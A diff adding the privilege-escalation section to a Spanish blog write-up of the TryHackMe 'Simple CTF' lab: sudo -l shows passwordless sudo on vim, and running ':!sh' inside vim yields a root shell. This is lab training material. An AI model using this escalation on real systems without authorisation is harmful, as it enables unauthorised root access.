@@ -1,7 +1,7 @@
 ---
 title: Try Hack Me Simple CTF
 author: k4miyo
-date: 2023-06-18
+date: 2023-06-19
 math: true
 mermaid: true
 image:
@@ -299,3 +299,31 @@ $ whoami
 mitch
 $ 
 ```
+
+En este punto ya podemos obtener la primera flag (user.txt). Ahora debemos encontrar una forma de escalar privilegios, por lo que vamos a enumerar un poco el sistema:
+
+```bash
+mitch@Machine:~$ id
+uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
+mitch@Machine:~$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+mitch@Machine:~$
+```
+
+Vemos que podemos ejecutar el binario `/usr/bin/vim` como **root** sin proporcionar contraseña; por lo que ya sebemos que debemos utilizar [GTFobins](gtfobins.github.io/):
+
+```bash
+mitch@Machine:~$ sudo /usr/bin/vim
+```
+
+Al abrir el editor `vim` escribimos `:!sh` y con esto ya podemos ejecutar comandos como el usuario **root**:
+
+```bash  
+:!sh
+# whoami
+root
+# 
+```
+
+Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
